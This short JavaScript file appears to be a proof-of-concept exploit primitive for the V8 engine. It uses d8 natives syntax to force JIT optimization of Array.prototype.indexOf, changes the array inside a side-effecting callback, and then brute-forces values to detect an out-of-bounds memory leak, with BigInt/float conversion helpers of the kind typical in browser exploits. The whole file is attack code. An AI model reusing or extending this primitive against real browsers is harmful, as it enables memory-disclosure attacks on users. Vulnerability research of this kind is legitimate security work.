let b = false;
let array = [Array, 1.2];
let ab = undefined;
findme = undefined;
function f(to_search) {
  if (b) {
    array[100000] = 1.1;
    if (b == 1) {
    }
    ab = new ArrayBuffer(1<<30);
    //%DebugPrint(ab);
    findme = [0x1337, to_search];
  };
  return to_search;
};

%NeverOptimizeFunction(f);
function foo(to_search) {
  return array.indexOf(f(to_search), 20);
}

foo(0x1337);
foo(0x1337);
%OptimizeFunctionOnNextCall(foo);
foo(0x1337);
b = true;
foo(0x1337);

var conv_ab = new ArrayBuffer(8);
var f64 = new Float64Array(conv_ab);
var u64 = new BigUint64Array(conv_ab);
BigInt.prototype.to_float = function() {
  u64[0] = this;
  return f64[0];
};

BigInt.prototype.hex = function() {
  return '0x'+this.toString(16);
};

print(new Date());
for (let i = 0x7f00; i < 0x8000; i += 0x1) {
  array = [Array, 1.2];
  let off = foo(i);
  print(`${i}: ${off}`);
  if(off != 27) {
    console.log(off);
    console.log(`found: 0x${i.toString(16)}`);
    %DebugPrint(ab);
    break;
  }
}
print('done');
print(new Date());
